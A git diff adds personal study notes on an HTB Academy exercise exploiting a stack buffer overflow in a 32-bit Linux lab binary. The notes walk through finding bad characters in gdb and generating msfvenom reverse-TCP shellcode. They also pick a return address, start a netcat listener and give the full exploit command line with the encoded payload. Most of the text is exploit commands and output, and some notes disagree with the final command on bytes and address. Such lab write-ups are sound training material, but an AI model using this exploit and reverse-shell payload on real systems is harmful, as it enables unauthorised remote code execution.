@@ -234,3 +234,181 @@ Often it can be useful to insert some `no operation instruction` (`NOPS`) before
    Shellcode = "\x44" * 150
    EIP = "\x66" * 4
 ```
+##### Buffer
+![Pasted image 20211212212346](https://user-images.githubusercontent.com/87600765/146050433-7d1247eb-1109-4105-b52e-75c5c134bb2f.png)
+#### Identification of bad characters
+Now we have to identify bad characters for running the program correctly.
+These reserved characters, also known as `bad characters` can vary, but often we will see characters like this:
+-   `\x00` - Null Byte (**always a bad character**)
+-   `\x0A` - Line Feed
+-   `\x0D` - Carriage Return
+-   `\xFF` - Form Feed
+this is our character list
+```md
+CHARS="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+```
+The char size is 256 bytes.
+```md
+Buffer = "\x55" * (2064 - 255 - 4) = 1805
+ CHARS = "\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
+   EIP = "\x66" * 4
+```
+We will set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory's content.
+##### Break point
+```nasm
+(gdb) break leavemsg
+Breakpoint 1 at 0x691
+(gdb)
+``` 
+##### Send chars
+```nasm
+(gdb) run $(python -c "print '\x55' * 1805 + '\x01\x02\x03\x04...<SNIP>...\xfd\xfe\xff' + '\x66' * 4")
+Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 1805 + '\x01\x02\x03\x04...<SNIP>...\xfd\xfe\xff' + '\x66' * 4")
+
+Breakpoint 1, 0x56555691 in leavemsg ()
+```
+Now we can examine the stack and identify the bad charcaters.
+```nasm
+...<SNIP>...
+0xffffd688:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd690:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd698:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
+													  # | ---> chars begin	
+0xffffd6a0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
+0xffffd6a8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14
+0xffffd6b0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c
+0xffffd6b8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24
+0xffffd6c0:     0x25    0x26    0x27    0x28    0x29    0x2a    0x2b    0x2c
+0xffffd6c8:     0x2d    0x2e    0x2f    0x30    0x31    0x32    0x33    0x34
+...<SNIP>...
+```
+We can see that after the "`\x08`", we encounter the `\x00` instead of the "`\x09`" as expected. We can remove `\x09`
+```nasm
+# Substract the number of removed characters
+Buffer = "\x55" * (2064 - 254 - 4) = 1806
+
+# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
+ CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
+ 
+   EIP = "\x66" * 4
+```
+##### 	Send CHARS- Without `\x09` 
+```nasm
+(gdb)run $(python -c "print '\x55' * 1806 + '\x01\x02\x03\x04\x05\x06\x07\x08\x0a\...<SNIP>...\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' + '\x66' * 4")
+``` 
+Then we examine the stack
+```nasm
+(gdb)x/3000xb $esp
+...<SNIP>...
+0xffffd698:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
+0xffffd6a0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
+...<SNIP...
+```
+We recognize that after the "`\x08`", we encounter the `\x00` instead of the "`\x0a`" as expected. We can remove `\x0a`
+
+##### Note
+```md
+# Substract the number of removed characters
+Buffer = "\x55" * (2064 - 253 - 4) = 1807	
+
+# "\x00" & "\x09" & "\x0a" removed: 256 - 3 = 253 bytes
+ CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0b...<SNIP>...\xfd\xfe\xff" 
+ 
+   EIP = "\x66" * 4
+```
+##### Senc CHARS-Without `\x09`  &  `\x0a`
+```nasm
+(gdb)run $(python -c "print '\x55' * 1807 + '\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c...<SNIP>...\xfc\xfd\xfe\xff' + '\x66' * 4")
+(gdb)x/3000xb $esp
+...<SNIP>...
+0xffffd6ac:     0x11    0x12    0x13    0x14    0x15    0x16    0x17    0x18
+0xffffd6b4:     0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f    0x00
+0xffffd6bc:     0x21    0x22    0x23    0x24    0x25    0x26    0x27    0x28
+...<SNIP>...
+```
+After `\x1f`, we encounter `\x00` instead of `\x20`. We can now remove it. 
+##### Note
+```md
+# Substract the number of removed characters
+Buffer = "\x55" * (2064 - 252 - 4) = 1808	
+
+# "\x00" & "\x09" & "\x0a" & "\x20" removed: 256 - 4 = 252 bytes
+ CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0b...<SNIP>...\xfd\xfe\xff" 
+ 
+   EIP = "\x66" * 4
+   ```
+If we sent char without `\x09` & `\x0a` & `\x20` and then examine the stack, we don't encounter bad charcater anymore
+Finally the bad characters are `\x00` (which is always a bad character) & `x09`  & `x0a` & `\x20`
+
+#### Generating our shellcode
+Now that we have idenfify the bad characters we can generate our shellcode.
+```nasm
+└─# msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+Saved as: shellcode
+``` 
+##### shellcode
+```md
+unsigned char buf[] =
+"\xda\xc3\xb8\x7d\x24\xf0\x6e\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
+"\x12\x83\xea\xfc\x31\x42\x13\x03\x3f\x37\x12\x9b\x8e\xec\x25"
+"\x87\xa3\x51\x99\x22\x41\xdf\xfc\x03\x23\x12\x7e\xf0\xf2\x1c"
+"\x40\x3a\x84\x14\xc6\x3d\xec\xd9\x38\xbe\xed\x4d\x3b\xbe\xfc"
+"\xd1\xb2\x5f\x4e\x8f\x94\xce\xfd\xe3\x16\x78\xe0\xc9\x99\x28"
+"\x8a\xbf\xb6\xbf\x22\x28\xe6\x10\xd0\xc1\x71\x8d\x46\x41\x0b"
+"\xb3\xd6\x6e\xc6\xb4";
+```
+Now that we have our shellcode, we adjust it to have only one string, and then we can adapt and submit our simple exploit again.
+```md
+   Buffer = "\x55" * (2064 - 124 - 95 - 4) = 1841
+     NOPs = "\x90" * 124
+Shellcode = "\xda\xc3\xb8\x7d...<SNIP>...\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb4"
+      EIP = "\x66" * 4'
+```
+
+#### Identification of the Return Address
+we now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address.
+```nasm
+(gdb)x/3000xb $esp
+...<SNIP>...
+0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd72c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd73c:     0xda    0xc3    0xb8    0x7d    0x24    0xf0    0x6e    0xd9
+0xffffd744:     0x74    0x24    0xf4    0x5a    0x29    0xc9    0xb1    0x12
+...<SNIP>...
+```
+In this case I want to choose the adress `0xffffd72c`.
+##### Buffer
+![image](https://user-images.githubusercontent.com/87600765/146051050-6f7fcc14-30d4-4774-8b8f-adce6628b7f6.png)
+So now we just have to replace `'\x64' * 4*`  to `0xffffd72c` but in little endian which is `0x2cd7ffff` which is `\x2c\xd7\xff\xff`.
+##### Notes
+```md
+   Buffer = "\x55" * (2064 - 124 - 95 - 4) = 1841
+     NOPs = "\x90" * 124
+Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
+      EIP = "\xc2\x7d\xff\xff"
+```
+
+##### Netcat
+Now let set up our listener
+```nasm
+htb-student@nixbof32skills:~$ nc -lnvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+```
+
+Now let execute our code **outside** gdb. 
+```nasm
+htb-student@nixbof32skills:~$ ./leave_msg $(python -c "print '\x55' * 1841 + '\x90' * 124 + '\xda\xc3\xb8\x7d\x24\xf0\x6e\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x42\x13\x03\x3f\x37\x12\x9b\x8e\xec\x25\x87\xa3\x51\x99\x22\x41\xdf\xfc\x03\x23\x12\x7e\xf0\xf2\x1c\x40\x3a\x84\x14\xc6\x3d\xec\xd9\x38\xbe\xed\x4d\x3b\xbe\xfc\xd1\xb2\x5f\x4e\x8f\x94\xce\xfd\xe3\x16\x78\xe0\xc9\x99\x28\x8a\xbf\xb6\xbf\x22\x28\xe6\x10\xd0\xc1\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb4' + '\x2c\xd7\xff\xff'")
+```
+![Pasted image 20211213202658](https://user-images.githubusercontent.com/87600765/146051300-1469520b-ed6c-4dd1-892a-c0fc7e1c2f0d.png)
+![Pasted image 20211213202831](https://user-images.githubusercontent.com/87600765/146051365-000e87e4-4e31-42b3-bb20-d24bb5313e22.png)
+
+All the images that you see is providing from the HTB Academy website and the buffer images were modified by me for illustrate what I were doing.
+
+*Academy, H. T. B. (n.d.). HTB Academy : Cyber security training. Cyber Security Training : HTB Academy. Retrieved December 14, 2021, from https://academy.hackthebox.com/module/details/318*
